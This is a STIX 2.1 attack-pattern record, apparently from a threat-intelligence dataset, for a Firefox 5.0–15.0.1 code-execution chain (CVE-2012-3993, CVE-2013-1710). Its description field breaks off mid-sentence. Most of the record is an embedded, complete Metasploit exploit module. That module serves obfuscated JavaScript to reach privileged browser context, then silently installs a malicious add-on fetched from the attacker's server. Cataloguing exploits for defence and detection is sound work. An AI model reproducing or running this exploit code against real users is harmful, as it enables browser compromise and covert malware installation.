{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23a1d551-1265-4f66-ac5b-1227e62a48e6",
    "created": "2024-08-14T17:06:17.405272Z",
    "modified": "2024-08-14T17:06:17.405276Z",
    "name": "Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution",
    "description": " On versions of Firefox from 5.0 to 15.0.1, the InstallTrigger global, when given invalid input, would throw an exception that did not have an __exposedProps__ property set. By re-setting this property on the exception object's prototype the chrome-based defineProperty method is made available.  With the defineProperty method, functions belonging to window and document can be overridden with a function that gets called from chrome-privileged context. From here another vulnerability in the crypto.generateCRMFRequest function is used to \"peek\"",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_proto_crmfrequest.rb",
            "external_id": "firefox_proto_crmfrequest.rb"
        },
        {
            "source_name": "MariuszMlynski",
            "external_id": "#discoveredCVE-2012-3993"
        },
        {
            "source_name": "moz_bug_r_a4",
            "external_id": "#discoveredCVE-2013-1710"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=768101"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::BrowserAutopwn\n  include Msf::Exploit::Remote::FirefoxAddonGenerator\n\n  autopwn_info({\n    :ua_name    => HttpClients::FF,\n    :ua_minver  => \"5.0\",\n    :ua_maxver  => \"15.0.1\",\n    :javascript => true,\n    :rank       => NormalRanking\n  })\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution',\n      'Description'    => %q{\n        On versions of Firefox from 5.0 to 15.0.1, the InstallTrigger global, when given\n        invalid input, would throw an exception that did not have an __exposedProps__\n        property set. By re-setting this property on the exception object's prototype,\n        the chrome-based defineProperty method is made available.\n\n        With the defineProperty method, functions belonging to window and document can be\n        overridden with a function that gets called from chrome-privileged context. From here,\n        another vulnerability in the crypto.generateCRMFRequest function is used to \"peek\"\n        into the context's private scope. Since the window does not have a chrome:// URL,\n        the insecure parts of Components.classes are not available, so instead the AddonManager\n        API is invoked to silently install a malicious plugin.\n      },\n      'License' => MSF_LICENSE,\n      'Author'  => [\n        'Mariusz Mlynski', # discovered CVE-2012-3993\n        'moz_bug_r_a4', # discovered CVE-2013-1710\n        'joev' # metasploit module\n      ],\n      'DisclosureDate' => '2013-08-06',\n      'References' => [\n        ['CVE', '2012-3993'],  # used to install function that gets called from chrome:// (ff<15)\n        ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=768101'],\n        ['CVE', '2013-1710'],  # used to peek into privileged caller's closure (ff<23)\n      ],\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::FF,\n        :ua_ver  => lambda { |ver| ver.to_i.between?(5, 15) }\n      }\n    ))\n\n    register_options([\n      OptString.new('CONTENT', [ false, \"Content to display inside the HTML <body>.\", '' ] )\n    ])\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    if request.uri.match(/\\.xpi$/i)\n      print_status(\"Sending the malicious addon\")\n      send_response(cli, generate_addon_xpi(cli).pack, { 'Content-Type' => 'application/x-xpinstall' })\n    else\n      print_status(\"Sending HTML\")\n      res = generate_html(target_info,request.headers['Host'])\n      vprint_status res.to_s\n      send_response_html(cli, res)\n    end\n  end\n\n  def generate_html(target_info,refer)\n    injection = if target_info[:ua_ver].to_i == 15\n      \"Function.prototype.call.call(p.__defineGetter__,obj,key,runme);\"\n    else\n      \"p2.constructor.defineProperty(obj,key,{get:runme});\"\n    end\n\n    if refer.nil? or refer.blank?\n      redirect = \"#{get_module_uri}/addon.xpi\"\n    else\n      proto = ((datastore['SSL']) ? 'https' : 'http')\n      redirect = \"#{proto}://#{refer}#{get_module_resource}addon.xpi\"\n    end\n\n    script = js_obfuscate %Q|\n      try{InstallTrigger.install(0)}catch(e){p=e;};\n      var p2=Object.getPrototypeOf(Object.getPrototypeOf(p));\n      p2.__exposedProps__={\n        constructor:'rw',\n        prototype:'rw',\n        defineProperty:'rw',\n        __exposedProps__:'rw'\n      };\n      var s = document.querySelector('#payload').innerHTML;\n      var q = false;\n      var register = function(obj,key) {\n        var runme = function(){\n          if (q) return;\n          q = true;\n          window.crypto.generateCRMFRequest(\"CN=Me\", \"foo\", \"bar\", null, s, 384, null, \"rsa-ex\");\n        };\n        try {\n          #{injection}\n        } catch (e) {}\n      };\n      for (var i in window) register(window, i);\n      for (var i in document) register(document, i);\n    |\n\n    js_payload = js_obfuscate %Q|\n      if (!window.done) {\n        window.AddonManager.getInstallForURL(\n          '#{redirect}',\n          function(install) { install.install() },\n          'application/x-xpinstall'\n        );\n        window.done = true;\n      }\n    |\n\n    %Q|\n      <html>\n      <body>\n      #{datastore['CONTENT']}\n      <div id='payload' style='display:none'>\n        #{js_payload}\n      </div>\n      <script>\n        #{script}\n      </script>\n      </body>\n      </html>\n    |\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-08-06"
}